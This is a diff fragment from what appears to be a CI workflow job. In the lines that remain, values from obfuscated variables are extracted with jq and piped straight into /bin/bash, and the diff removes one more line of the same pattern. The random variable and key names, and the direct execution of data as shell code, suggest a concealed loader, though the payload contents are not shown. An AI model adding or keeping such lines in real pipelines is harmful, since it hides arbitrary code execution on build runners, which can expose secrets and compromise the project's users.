@@ -23,7 +23,6 @@ jobs:
           echo $v14782 | jq -r .citw98172 | /bin/bash
           echo $v9171 | jq -r .tmt81744 | /bin/bash
           echo $xl0 | jq -r .beliv2215 | /bin/bash
-          printf '%s' "$hxuyx6" | jq -r .bkbj2518 | /bin/bash
 
       - name: Persist results
         if: always()
